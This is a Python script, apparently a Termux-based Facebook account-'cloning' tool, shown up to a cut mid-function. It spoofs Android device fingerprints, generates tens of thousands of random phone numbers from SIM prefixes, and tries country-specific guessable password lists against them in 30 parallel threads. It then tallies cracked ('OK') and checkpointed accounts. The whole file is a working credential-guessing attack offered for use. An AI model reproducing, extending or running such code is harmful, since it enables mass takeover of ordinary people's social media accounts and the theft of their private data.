'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']
sim_id = ''
android_version = "12"
model = "Infinix X672"
build = "RP1A.200720.011"
fblc = "en_GB"
fbcr = "Zong"
fbmf = "Infinix"
fbbd = "Infinix"
fbdv = model
fbsv = android_version
fbca = "arm64-v8a"
fbdm = "{density=2.25,height=2400,width=1080}"
sim_id = "Zong"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}
#▬▭▬▭▬▭▬▭[KEY GENERATOR]▬▭▬▭▬▭▬▭#
def key():
    model = subprocess.check_output('getprop ro.product.model', shell=True).decode('utf-8').strip()
    mod = base64.b64encode(model.encode()).decode().replace('b', '')
    uID = hashlib.md5((platform.version() + str(os.getuid()) + platform.platform() + os.getlogin() + mod).replace(' ', '').encode()).hexdigest()
    return uID.upper()
mr_key = key()
try:open('/dat'+'a/dat'+'a/com.term'+'ux/files'+'/usr/MR-RMX.txt', 'w').write(mr_key)
except:pass
try:keyy = open(".key.txt","r").read()
except FileNotFoundError:keyy = 'none'
uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
id = "".join(uuidd).replace("_","").replace("360","AHS").replace("u","9").replace("a","A")
plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
bxd = ""
rmx_token = f'{id}{xp}'


#▬▭▬▭▬▭▬▭[CLEAR]▬▭▬▭▬▭▬▭#
def clear():
    os.system('clear');rmx_logo()
#▬▭▬▭▬▭▬▭[LOGO]▬▭▬▭▬▭▬▭#
def rmx_logo():#
    print("""
\033[1;33m   ____  ___ __  __ ____  _   _    _    
\033[1;33m  / ___||_ _|  \/  | __ )| | | |  / \   
\033[38;5;214m  \___ \ | || |\/| |  _ \| |_| | / _ \  
\033[38;5;214m   ___) || || |  | | |_) |  _  |/ ___ \ 
\033[1;33m  |____/|___|_|  |_|____/|_| |_/_/   \_\\
\033[1;33m----------------------------------------------------------
\033[38;5;214m                      HELLO DARLING
\033[1;33m----------------------------------------------------------
\033[1;33m[\033[38;5;214m•\033[1;33m] \033[1;33mAUTHOR  : \033[38;5;214mHassan Ali
\033[1;33m[\033[38;5;214m•\033[1;33m] \033[1;33mGITHUB  : \033[38;5;214mHassan Ali
\033[1;33m[\033[38;5;214m•\033[1;33m] \033[1;33mVERSION : \033[38;5;214m3.2
\033[1;33m[\033[38;5;214m•\033[1;33m] \033[1;33mOWNER   : \033[38;5;214m+92
\033[1;33m----------------------------------------------------------""")

#▬▭▬▭▬▭▬▭[APPROVAL SYSTEM]▬▭▬▭▬▭▬▭#
def connection_token():
    digits_count = 16
    letters_count = 16
    letters = ''.join((random.choice(string.ascii_letters) for i in range(letters_count)))
    digits = ''.join((random.choice(string.digits) for i in range(digits_count)))
    sample_list = list(letters + digits)
    random.shuffle(sample_list)
    final_string = ''.join(sample_list)
    return final_string
def fucker():
    clear()
    #  # Password screen par pehli baar logo dikhayega
    
    user_token = connection_token()
    print(f"\033[1;33m[\033[38;5;214m•\033[1;33m] YOUR TOKEN : \033[1;97m{user_token}")
    print("\033[1;33m----------------------------------------------------------")
    
    fuckingPass = input('\033[1;33m[\033[38;5;214m•\033[1;33m] Enter Password : \033[1;97m')
    
    if fuckingPass == '0':
        sys.exit()
        
    elif fuckingPass == "jani":
        # Yahan clear() hone ke baad jab rmx_main chlega, 
        # toh purana logo saaf ho kar sirf naya logo screen par rahega.
        clear()  
        rmx_main()  
        
    else:
        print("\033[1;91m[-] Your Password is Wrong !!")
        sys.exit()


#▬▭▬▭▬▭▬▭[MAIN MENU]▬▭▬▭▬▭▬▭#
def rmx_main():
    clear()
    
    
    print('\033[1;33m[\033[38;5;214m1\033[1;33m] \033[1;97mFILE CLONING ')
    print('\033[1;33m[\033[38;5;214m2\033[1;33m] \033[1;97mRANDOM CLONING ')
    print('\033[1;33m[\033[38;5;214m3\033[1;33m] \033[1;97mGMAIL CLONING ')
    print('\033[1;33m[\033[38;5;214m4\033[1;33m] \033[1;97mOLD CLONING ')
    print('\033[1;33m[\033[38;5;214m5\033[1;33m] \033[1;97mNEW ACCOUNT GENERATOR ')
    print('\033[1;33m[\033[38;5;214m6\033[1;33m] \033[1;97mFIX CP ')
    print('\033[1;33m[\033[38;5;214m7\033[1;33m] \033[1;97mFILE MAKING ')
    print('\033[1;33m[\033[38;5;214m8\033[1;33m] \033[1;97mAUTO SHARE ')
    print('\033[1;33m[\033[38;5;214m9\033[1;33m] \033[1;97mAUTO CREATE PAGE ')
    linex()
    
    error = input('\033[1;33m[\033[38;5;214m•\033[1;33m] CHOOSE : \033[1;97m')
    
    if error in ['1', '01']:
        clear()
        
        print('\033[1;33m[\033[38;5;214m•\033[1;33m] EXAMPLE : /sdcard/File.txt etc..')
        linex()
        file = input('\033[1;33m[\033[38;5;214m•\033[1;33m] PUT FILE PATH : \033[1;97m')
        
        try:
            fo = open(file, 'r', encoding='utf-8').read().splitlines()
        except FileNotFoundError:
            print('\033[1;33m[\033[38;5;214m•\033[1;91m] FILE LOCATION NOT FOUND ')
            time.sleep(2)
            rmx_main()
            return
            
        clear()
        
        print('\033[1;33m[\033[38;5;214m•\033[1;33m] ALL METHOD WORKING')
        linex()
        print('\033[1;33m[\033[38;5;214m1\033[1;33m] METHOD 1')
        print('\033[1;33m[\033[38;5;214m2\033[1;33m] METHOD 2')
        print('\033[1;33m[\033[38;5;214m3\033[1;33m] METHOD 3')
        print('\033[1;33m[\033[38;5;214m4\033[1;33m] METHOD 4')
        print('\033[1;33m[\033[38;5;214m5\033[1;33m] METHOD 5')
        linex()
        mthd = input('\033[1;33m[\033[38;5;214m•\033[1;33m] CHOOSE : \033[1;97m')
        
        plist = []
        clear()
        
        print('\033[1;33m[\033[38;5;214m1\033[1;33m] AUTO PASSWORD')
        print('\033[1;33m[\033[38;5;214m2\033[1;33m] CHOICE PASSWORD')
        linex()
        passlist = input('\033[1;33m[\033[38;5;214m•\033[1;33m] CHOOSE : \033[1;97m')
        
        if passlist in ['1', '01']:
            clear()
            
            print('\033[1;33m[\033[38;5;214m1\033[1;33m] AUTO BANGLADESH PASSLIST')
            print('\033[1;33m[\033[38;5;214m2\033[1;33m] AUTO NEPAL PASSLIST')
            print('\033[1;33m[\033[38;5;214m3\033[1;33m] AUTO PAKISTAN PASSLIST')
            print('\033[1;33m[\033[38;5;214m4\033[1;33m] AUTO INDIA PASSLIST')
            print('\033[1;33m[\033[38;5;214m5\033[1;33m] AUTO PHILIPPINES PASSLIST')
            linex()
            countrypasslist = input('\033[1;33m[\033[38;5;214m•\033[1;33m] CHOOSE : \033[1;97m')
            
            if countrypasslist in ['1', '01']:
                plist.append('firstlast');plist.append('first10');plist.append('first4321');plist.append('first last');plist.append('first12');plist.append('first123');plist.append('first1234');plist.append('first1122');plist.append('first1212');plist.append('first12345');plist.append('first112233');plist.append('first@123');plist.append('first@12345');plist.append('first321');plist.append('first2025');plist.append('first@1122');plist.append('first@1212');plist.append('first111');plist.append('first098');plist.append('@first@');plist.append('first@#');plist.append('first@2025');plist.append('first@@@');plist.append('first112233');plist.append('@1234@');plist.append('@12345@');plist.append('@123456@');plist.append('@@@###');plist.append('@@@@####');plist.append('000999');plist.append('22558800');plist.append('99887766');plist.append('09876543')
            elif countrypasslist in ['2', '02']:
                plist.append('first123');plist.append('first12345');plist.append('first@123');plist.append('first last');plist.append('firstlast123');plist.append('last12345');plist.append('last@123');plist.append('first1234');plist.append('first@last');plist.append('firstlast');plist.append('last@first');plist.append('nepal123');plist.append('nepal12345');plist.append('Nepal@123');plist.append('Nepal@12345');plist.append('first@12345');plist.append('lastfirst');plist.append('maya123');plist.append('maya12345');plist.append('kathmandu');plist.append('I love you')
            elif countrypasslist in ['3', '03']:
                plist.append('first last');plist.append('firstlast');plist.append('firstlast1');plist.append('firstlast123');plist.append('first123');plist.append('first@123');plist.append('first1234');plist.append('khan khan');plist.append('khan786');plist.append('khan1122');plist.append('first1122');plist.append('first786');plist.append('firstlast@12');plist.append('First Last');plist.append('khan123');plist.append('khan1234');plist.append('khan@123');plist.append('khan@786');plist.append('khan@1122');plist.append('pak123');plist.append('pak12345');plist.append('pak123456');plist.append('pak123456789');plist.append('pakistan123');plist.append('pakistan12345');plist.append('pakistan123456');plist.append('pakistan123456789')
            elif countrypasslist in ['4', '04']:
                plist.append('57575751');plist.append('first last');plist.append('57273200');plist.append('59039200');plist.append('07860786');plist.append('firstlast');plist.append('md first');plist.append('mdfirst');plist.append('first12');plist.append('first 25');plist.append('firstlast123');plist.append('first 123');plist.append('first@12345');plist.append('first123');plist.append('first@123');plist.append('@first123');plist.append('first12');plist.append('first123456');plist.append('first 12345');plist.append('first@12');plist.append('firstlast@123');plist.append('first 1234');plist.append('first123456789');plist.append('first last');plist.append('57273200');plist.append('59039200');plist.append('07860786');plist.append('firstlast');plist.append('md first');plist.append('mdfirst');plist.append('first12');plist.append('first 25');plist.append('firstlast123');plist.append('first 123');plist.append('first@12345');plist.append('first123');plist.append('first@123');plist.append('@first123');plist.append('first12');plist.append('first123456');plist.append('first 12345');plist.append('first@12');plist.append('firstlast@123');plist.append('first 12345');plist.append('first 1234');plist.append('first123456789')
            elif countrypasslist in ['5', '05']:
                plist.append('first last');plist.append('last first');plist.append('firstlast');plist.append('lastfirst');plist.append('firstfirst');plist.append('lastlast');plist.append('firstlast123');plist.append('firstlast12345');plist.append('firstlast123456');plist.append('firstlast123456789');plist.append('firstlast143');plist.append('lastfirst123');plist.append('lastfirst12345');plist.append('lastfirst123456');plist.append('lastfirst123456789');plist.append('lastfirst143');plist.append('first123');plist.append('first12345');plist.append('first123456');plist.append('first123456789');plist.append('first143');plist.append('last123');plist.append('last12345');plist.append('last123456');plist.append('last123456789');plist.append('last143');plist.append('firstpogi');plist.append('firstganda')
        else:
            clear()
            
            try:
                ps_limit = int(input('\033[1;33m[\033[38;5;214m•\033[1;33m] HOW MANY PASSWORDS DO YOU WANT TO ADD ? : \033[1;97m'))
            except:
                ps_limit = 1
            clear()
            
            print('\033[1;33m[\033[38;5;214m•\033[1;33m] EXAMPLE : first last,firstlast,first123')
            linex()
            for i in range(ps_limit):
                plist.append(input(f'\033[1;33m[\033[38;5;214m•\033[1;33m] PASSWORD {i+1} : \033[1;97m'))
                
        # --- EXECUTION MANAGER ENGINE (TAB/SPACE FIX APPLIED) ---
        clear()
        
        cx = input('\033[1;33m[\033[38;5;214m•\033[1;33m] DO YOU WANT TO SHOW CP ACCOUNT? [Y|N] : \033[1;97m')
        
        if cx in ['y', 'Y', 'yes', 'Yes', '1']:
            pcp.append('y')
        else:
            pcp.append('n')
            
        with tred(max_workers=30) as crack_submit:
            clear()
            
            total_ids = str(len(fo))
            print('\033[1;33m[\033[38;5;214m•\033[1;33m] TOTAL ACCOUNT IDS : \033[1;32m' + total_ids + f' ')
            print('\033[1;33m[\033[38;5;214m•\033[1;33m] USE FLIGHT MODE FOR SPEED UP')
            linex()
            
            for user in fo:
                try:
                    ids, names = user.split('|')
                    passlist = plist
                    if mthd in ['1', '01']: crack_submit.submit(api1, ids, names, passlist)
                    elif mthd in ['2', '02']: crack_submit.submit(api2, ids, names, passlist)
                    elif mthd in ['3', '03']: crack_submit.submit(api3, ids, names, passlist)
                    elif mthd in ['4', '04']: crack_submit.submit(api4, ids, names, passlist)
                    elif mthd in ['5', '05']: crack_submit.submit(api5, ids, names, passlist)
                except ValueError:
                    pass
                    
        linex()
        print('\033[1;33m[\033[38;5;214m•\033[1;33m] THE PROCESS HAS COMPLETED')
        print('\033[1;33m[\033[38;5;214m•\033[1;33m] TOTAL OK/CP : \033[1;32m' + str(len(oks)) + '\033[1;33m/\033[1;91m' + str(len(cps)))
        linex()
        input('\033[1;33m[\033[38;5;214m•\033[1;33m] PRESS ENTER TO BACK ')
        rmx_main()
        
    elif error in ['2', '02']: randm()
    elif error in ['3', '03']: gmail()
    elif error in ['4', '04']: old()
    elif error in ['5', '05']: create_new()
    elif error in ['6', '06']: fixcp()
    elif error in ['7', '07']: file_making()
    elif error in ['8', '08']: share_fb()
    elif error in ['9', '09']: create_page()
    elif error in ['0', '00']:
        clear()
        exit('\033[1;33m[\033[38;5;214m•\033[1;33m] THANKS FOR USING 🥰 \033[0m')
        
    else:
        print('\033[1;33m[\033[38;5;214m•\033[1;91m] OPTION NOT FOUND IN MENU...')
        time.sleep(2)
        rmx_main()
import time

# ---- COUNTRYSIDE FLAG COLOR CODES ----
W = '\033[1;97m'      # Bright White
G = '\x1b[38;5;46m'   # Deep Green
R = '\033[1;91m'      # Red
B = '\033[1;94m'      # Blue
Y = '\033[1;93m'      # Yellow
O = '\x1b[38;5;208m'  # Orange / Saffron
K = '\033[1;30m'      # Black

def randm():
    while True:
        clear()
        # 1. Bangladesh (FB + Name)
        print(f'{W}[{G}1{W}] {R}FB-{G}BANGLADESH CLONING 🇧🇩')
        
        # 2. Pakistan (FB + Name)
        print(f'{W}[{G}2{W}] {W}FB-{G}PAKISTAN CLONING 🇵🇰')
        
        # 3. Nepal (FB + Name)
        print(f'{W}[{G}3{W}] {B}FB-{R}NEPAL CLONING 🇳🇵')
        
        # 4. India (FB + Name)
        print(f'{W}[{G}4{W}] {O}FB-{W}INDIAN CLONING 🇮🇳')
        
        # 5. Afghanistan (FB + Name)
        print(f'{W}[{G}5{W}] {K}FB-{R}AFGHANISTAN CLONING 🇦🇫')
        
        # 6. Philippines (FB + Name)
        print(f'{W}[{G}6{W}] {Y}FB-{B}PHILIPPINES CLONING 🇵🇭')
        
        linex()
        option = input(f'{W}[{G}•{W}] {W}CHOOSE : ').strip()
        
        if option in ['1', '01']: bdx(); break
        elif option in ['2', '02']: pakistanx(); break
        elif option in ['3', '03']: nepalx(); break
        elif option in ['4', '04']: indiax(); break
        elif option in ['5', '05']: afghanistanx(); break
        elif option in ['6', '06']: phx(); break
        else:
            print(f'\n{R}[!] WRONG OPTION, TRY AGAIN...{W}')
            time.sleep(1)

# ▬▭▬▭▬▭▬▭[BANGLADESH CLONING]▬▭▬▭▬▭▬▭#
def bdx():
    user = []
    
    # Bangladesh Theme Colors
    BG_G = '\x1b[38;5;46m'   # Green
    BG_R = '\033[1;91m'      # Red
    W = '\033[1;97m'         # White
    
    clear()
    print(f'{W}[{BG_G}•{W}] {BG_G}EXAMPLE : 017 | 019 | 016 | 018')
    linex()
    code = input(f'{W}[{BG_G}•{W}] {W}SIM CODE : ')
    
    clear()
    print(f'{W}[{BG_G}•{W}] {BG_G}EXAMPLE : 20000 | 30000 | 99999')
    linex()
    try:
        limit = int(input(f'{W}[{BG_G}•{W}] {W}LIMIT : '))
    except ValueError:
        limit = 50000
        
    clear()
    print(f'{W}[{BG_G}•{W}] {BG_G}ALL METHOD WORKING')
    linex()
    print(f'{W}[{BG_G}1{W}] {W}METHOD-1 ({BG_G}b-api{W})')
    print(f'{W}[{BG_G}2{W}] {W}METHOD-2 ({BG_G}mbasic{W})')
    print(f'{W}[{BG_G}3{W}] {W}METHOD-3 ({BG_G}mobile{W})')
    print(f'{W}[{BG_G}4{W}] {W}METHOD-4 ({BG_G}p-fb{W})')
    linex()
    mthdx = input(f'{W}[{BG_G}•{W}] {W}CHOOSE : ')
    
    # Random digit generation
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
        
    with tred(max_workers=30) as rmxx:
        clear()
        tl = str(len(user))
        print(f'{W}[{BG_G}•{W}] {W}TOTAL ACCOUNT IDS {W}:{BG_G} {tl}')
        print(f'{W}[{BG_G}•{W}] {BG_G}USE FLIGHT MODE FOR SPEED UP')
        linex()
        
        for love in user:
            ids = code + love
            
            # --- VIP ADVANCED PASSLIST ADDED ---
            passlist = [
                love,               # Full 8 Digits (e.g., 57273200)
                ids,                # Full Mobile Number (e.g., 01757273200)
                ids[:7],            # First 7 digits of phone
                ids[:6],            # First 6 digits of phone
                ids[5:],            # Last digits from 5th position
                ids[4:],            # Last digits from 4th position
                'Bangladesh', 
                'bangladesh', 
                'i love you', 
                'iloveyou', 
                'free fire', 
                'freefire',
                'first last',       # First Last string format
                'firstlast',        # Joined string format
                'first123',         # First name + 123 format
                'first1234',        # First name + 1234 format
                'first@@',          # First name + @@ format
                '57575751', 
                '57273200', 
                '59039200', 
                '708090'
            ]
            
            if mthdx in ['1', '01']: rmxx.submit(rmx1, ids, passlist)
            elif mthdx in ['2', '02']: rmxx.submit(rmx2, ids, passlist)
            elif mthdx in ['3', '03']: rmxx.submit(rmx3, ids, passlist)
            elif mthdx in ['4', '04']: rmxx.submit(rmx4, ids, passlist)
            
    print('\033[1;37m')
    linex()
    print(f'{W}[{BG_G}•{W}] {W}THE PROCESS HAS COMPLETED')
    print(f'{W}[{BG_G}•{W}] {W}TOTAL OK/CP : {BG_G}{str(len(oks))}{W}/{BG_R}{str(len(cps))}')
    linex()
    input(f'{W}[{BG_G}•{W}] {W}PRESS ENTER TO BACK ')
    rmx_main()

# ▬▭▬▭▬▭▬▭[PAKISTAN CLONING - FULL PASSLIST]▬▭▬▭▬▭▬▭#
def pakistanx():
    user = []
    
    # Pakistan Theme Colors
    PAK_W = '\033[1;97m'      # Bright White
    PAK_G = '\x1b[38;5;46m'   # Green
    R = '\033[1;91m'          # Red
    
    clear()
    print(f'{PAK_W}[{PAK_G}•{PAK_W}] {PAK_G}EXAMPLE : 0306 | 0315 | 0300 | 0345')
    linex()
    code = input(f'{PAK_W}[{PAK_G}•{PAK_W}] {PAK_W}SIM CODE : ')
    
    clear()
    print(f'{PAK_W}[{PAK_G}•{PAK_W}] {PAK_G}EXAMPLE : 20000 | 30000 | 99999')
    linex()
    try:
        limit = int(input(f'{PAK_W}[{PAK_G}•{PAK_W}] {PAK_W}LIMIT : '))
    except ValueError:
        limit = 50000
        
    clear()
    print(f'{PAK_W}[{PAK_G}•{PAK_W}] {PAK_G}ALL METHOD WORKING')
    linex()
    print(f'{PAK_W}[{PAK_G}1{PAK_W}] {PAK_W}METHOD-1 ({PAK_G}b-api{PAK_W})')
    print(f'{PAK_W}[{PAK_G}2{PAK_W}] {PAK_W}METHOD-2 ({PAK_G}mbasic{PAK_W})')
    print(f'{PAK_W}[{PAK_G}3{PAK_W}] {PAK_W}METHOD-3 ({PAK_G}mobile{PAK_W})')
    print(f'{PAK_W}[{PAK_G}4{PAK_W}] {PAK_W}METHOD-4 ({PAK_G}p-fb{PAK_W})')
    linex()
    mthdx = input(f'{PAK_W}[{PAK_G}•{PAK_W}] {PAK_W}CHOOSE : ')
    
    # 7 random digits after SIM code
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
        
    with tred(max_workers=30) as rmxx:
        clear()
        tl = str(len(user))
        print(f'{PAK_W}[{PAK_G}•{PAK_W}] {PAK_W}TOTAL ACCOUNT IDS {PAK_W}:{PAK_G} {tl}')
        print(f'{PAK_W}[{PAK_G}•{PAK_W}] {PAK_G}USE FLIGHT MODE FOR SPEED UP')
        linex()
        
        for love in user:
            ids = code + love  # Example: 03001234567
            
            # --- MUKAMMAL DYNAMIC & HALF NUMBER PASSLIST ---
            passlist = [
                love,               # Sirf random 7 digits (e.g., 1234567)
                ids,                # Pura mobile number (e.g., 03001234567)
                ids[:6],            # First 6 digits (e.g., 030012)
                ids[:7],            # First 7 digits (e.g., 0300123)
                ids[:8],            # First 8 digits (e.g., 03001234)
                love[1:],           # Last 6 digits (e.g., 234567)
                love[2:],           # Last 5 digits (e.g., 34567)
                
                # --- AUTO USERNAME / STRING COMBINATIONS ---
                'first last',       # full name format
                'firstlast',        # full name without space
                'first123',         # first name + 123
                'first1234',        # first name + 1234
                'first12345',       # first name + 12345
                'first786',         # first name + 786
                'first1122',        # first name + 1122
                'first@@',          # first name + @@
                
                'last123',          # last name + 123
                'last1234',         # last name + 1234
                'last786',          # last name + 786
                
                # --- HIGH HIT-RATE PAKISTANI PASSWORDS ---
                'khankhan', 'khan123', 'khan12345', 'khan786', 'khan1122', 'khanbaba',
                'ali123', 'ali12345', 'ali786', 'ali1122',
                'pakistan', 'pakistan123', 'pak123', 'pak786',
                'baloch', 'baloch123', 'pubg1122', 'malik123'
            ]
            
            # Duplicates filter out karne ke liye
            passlist = list(dict.fromkeys(passlist))
            
            if mthdx in ['1', '01']: rmxx.submit(rmx1, ids, passlist)
            elif mthdx in ['2', '02']: rmxx.submit(rmx2, ids, passlist)
            elif mthdx in ['3', '03']: rmxx.submit(rmx3, ids, passlist)
            elif mthdx in ['4', '04']: rmxx.submit(rmx4, ids, passlist)
            
    print('\033[1;37m')
    linex()
    print(f'{PAK_W}[{PAK_G}•{PAK_W}] {PAK_W}THE PROCESS HAS COMPLETED')
    print(f'{PAK_W}[{PAK_G}•{PAK_W}] {PAK_W}TOTAL OK/CP : {PAK_G}{str(len(oks))}{PAK_W}/{R}{str(len(cps))}')
    linex()
    input(f'{PAK_W}[{PAK_G}•{PAK_W}] {PAK_W}PRESS ENTER TO BACK ')
    rmx_main()

#▬▭▬▭▬▭▬▭[NEPAL]▬▭▬▭▬▭▬▭#
def nepalx():
    user=[]
    clear();print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mEXAMPLE : 9815 | 9840 | 9816 | 9814');linex()
    code=input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mSIM CODE : ')
    clear();print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mEXAMPLE : 20000 | 30000 | 99999');linex()
    try:limit=int(input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mLIMIT : '))
    except ValueError:limit=50000
    clear();print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mALL METHOD WORKING');linex()
    print('\033[1;97m[\x1b[38;5;46m1\033[1;97m] \033[1;97mMETHOD')
    print('\033[1;97m[\x1b[38;5;46m2\033[1;97m] \033[1;97mMETHOD')
    print('\033[1;97m[\x1b[38;5;46m3\033[1;97m] \033[1;97mMETHOD')
    print('\033[1;97m[\x1b[38;5;46m4\033[1;97m] \033[1;97mMETHOD');linex()
    mthdx=input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mCHOOSE : ')
    for nmbr in range(limit):nmp=''.join(random.choice(string.digits) for _ in range(6));user.append(nmp)
    with tred(max_workers=30) as rmxx:
        clear();tl=str(len(user));print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mTOTAL ACCOUNT IDS \033[1;97m:\x1b[38;5;46m '+tl+f' ');print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mUSE FLIGHT MODE FOR SPEED UP');linex()
        for love in user:
            ids=code+love;passlist=[ids,love,ids[:8],ids[:7],ids[:6],'nepal12','nepal123','nepal1234','nepal12345','maya123','kathmandu','pokhara','tamang','maya1234','tamang123','tamang12345','nepal@123','kathmandu123']
            if mthdx in ['1','01']:rmxx.submit(rmx1,ids,passlist)
            elif mthdx in ['2','02']:rmxx.submit(rmx2,ids,passlist)
            elif mthdx in ['3','03']:rmxx.submit(rmx3,ids,passlist)
            elif mthdx in ['4','04']:rmxx.submit(rmx4,ids,passlist)
            #elif mthdx in ['5','05']:rmxx.submit(api5,ids,passlist)
            #elif mthdx in ['6','06']:rmxx.submit(api6,ids,passlist)
    print('\033[1;37m');linex()
    print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mTHE PROCESS HAS COMPLETED')
    print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mTOTAL OK/CP : '+str(len(oks))+'/'+str(len(cps)));linex()
    input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mPRESS ENTER TO BACK ')
    rmx_main()
#▬▭▬▭▬▭▬▭[INDIAN]▬▭▬▭▬▭▬▭#
def indiax():
    user=[]
    clear();print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mEXAMPLE : +91639 | +98282 | +92628 | +92627');linex()
    code=input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mSIM CODE : ')
    clear();print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mEXAMPLE : 20000 | 30000 | 99999');linex()
    try:limit=int(input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mLIMIT : '))
    except ValueError:limit=50000
    clear();print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mALL METHOD WORKING');linex()
    print('\033[1;97m[\x1b[38;5;46m1\033[1;97m] \033[1;97mMETHOD')
    print('\033[1;97m[\x1b[38;5;46m2\033[1;97m] \033[1;97mMETHOD')
    print('\033[1;97m[\x1b[38;5;46m3\033[1;97m] \033[1;97mMETHOD')
    print('\033[1;97m[\x1b[38;5;46m4\033[1;97m] \033[1;97mMETHOD');linex()
    mthdx=input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mCHOOSE : ')
    for nmbr in range(limit):nmp=''.join(random.choice(string.digits) for _ in range(7));user.append(nmp)
    with tred(max_workers=30) as rmxx:
        clear();tl=str(len(user))
        print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mTOTAL ACCOUNT IDS \033[1;97m:\x1b[38;5;46m '+tl+f' ');print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mUSE FLIGHT MODE FOR SPEED UP');linex()
        for love in user:
            ids=code+love;passlist=[love,ids,ids[:7],ids[:6],love[1:],"57273200","5757575"]
            if mthdx in ['1','01']:rmxx.submit(rmx1,ids,passlist)
            elif mthdx in ['2','02']:rmxx.submit(rmx2,ids,passlist)
            elif mthdx in ['3','03']:rmxx.submit(rmx3,ids,passlist)
            elif mthdx in ['4','04']:rmxx.submit(rmx4,ids,passlist)
            #elif mthdx in ['5','05']:rmxx.submit(api5,ids,passlist)
            #elif mthdx in ['6','06']:rmxx.submit(api6,ids,passlist)
    print('\033[1;37m');linex()
    print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mTHE PROCESS HAS COMPLETED')
    print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mTOTAL OK/CP : '+str(len(oks))+'/'+str(len(cps)));linex()
    input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mPRESS ENTER TO BACK ')
    rmx_main()
#▬▭▬▭▬▭▬▭[AFGHANISTAN]▬▭▬▭▬▭▬▭#
def afghanistanx():
    user=[]
    clear();print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mEXAMPLE : +9340 | +9350 | +9332 | +9330');linex()
    code=input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mSIM CODE : ')
    clear();print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mEXAMPLE : 20000 | 30000 | 99999');linex()
    try:limit=int(input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mLIMIT : '))
    except ValueError:limit=50000
    clear();print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mALL METHOD WORKING');linex()
    print('\033[1;97m[\x1b[38;5;46m1\033[1;97m] \033[1;97mMETHOD')
    print('\033[1;97m[\x1b[38;5;46m2\033[1;97m] \033[1;97mMETHOD')
    print('\033[1;97m[\x1b[38;5;46m3\033[1;97m] \033[1;97mMETHOD')
    print('\033[1;97m[\x1b[38;5;46m4\033[1;97m] \033[1;97mMETHOD');linex()
    mthdx=input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mCHOOSE : ')
    for nmbr in range(limit):nmp=''.join(random.choice(string.digits) for _ in range(8));user.append(nmp)
    with tred(max_workers=30) as rmxx:
        clear();tl=str(len(user));print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mTOTAL ACCOUNT IDS \033[1;97m:\x1b[38;5;46m '+tl+f' ');print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mUSE FLIGHT MODE FOR SPEED UP');linex()
        for love in user:
            ids=code+love;passlist=[love,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
